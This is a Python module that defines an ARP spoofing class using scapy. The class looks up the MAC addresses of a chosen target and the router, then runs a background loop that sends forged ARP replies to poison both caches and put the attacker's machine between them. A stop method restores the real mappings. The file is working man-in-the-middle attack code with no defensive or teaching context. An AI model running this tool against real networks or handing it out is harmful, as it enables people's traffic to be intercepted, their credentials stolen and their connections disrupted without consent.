import os
from scapy.all import *
from ..utils import get_mac, get_router_ip
from time import sleep
import multiprocessing


class ARPSpoofer():
    def __init__(self, target_ip, interface="wlan0", router_ip=get_router_ip()):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.target_mac = get_mac(self.target_ip, interface)
        self.router_mac = get_mac(self.router_ip, interface)
        if not self.target_mac:
            raise Exception("Couldn't find target MAC")
        if not self.router_mac:
            raise Exception("Couldn't find router MAC")
        self.poison_process = None

    def arp_poison(self):
        while 1:
            send(ARP(op=2, pdst=self.target_ip,
                     psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
            send(ARP(op=2, pdst=self.router_ip,
                     psrc=self.target_ip, hwdst=self.router_mac), verbose=False)
            sleep(3)

    def start(self, verbose=True):
        if verbose:
            print("Starting ARP spoofing...")
        self.poison_process = multiprocessing.Process(target=self.arp_poison)
        self.poison_process.start()

    def stop(self, verbose=True):
        if verbose:
            print("Stopping ARP spoofing...")
        if self.poison_process:
            self.poison_process.terminate()
            self.poison_process.join()
            if verbose:
                print("ARP spoofing stopped.")

        if verbose:
            print("Restoring targets")
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)
